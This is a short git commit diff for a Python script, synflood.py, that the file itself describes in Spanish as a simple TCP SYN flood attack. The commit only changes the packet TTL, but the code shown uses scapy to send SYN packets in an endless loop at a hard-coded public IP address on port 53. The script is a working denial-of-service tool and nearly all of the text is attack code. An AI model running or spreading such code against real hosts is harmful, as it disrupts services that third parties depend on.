4df5af3819fd83129adb7d96a954611bc1621348
hackingyseguridad <antonio_taboada@hotmail.es>
2019-10-09 09:15:00 +0200

    Update synflood.py

--- synflood.py
+++ synflood.py
@@ -4,7 +4,7 @@
 # Description : Simple ataque de inundacion de paquetes TCP SYN
 import sys
 from scapy.all import *
-ip=IP(dst="2.136.159.113",frag=0,ttl=255)
+ip=IP(dst="2.136.159.113",frag=0,ttl=64)
 SYN=TCP(sport=RandShort(),dport=53,flags="S",window=29200)
 while True:
     send(ip/SYN)
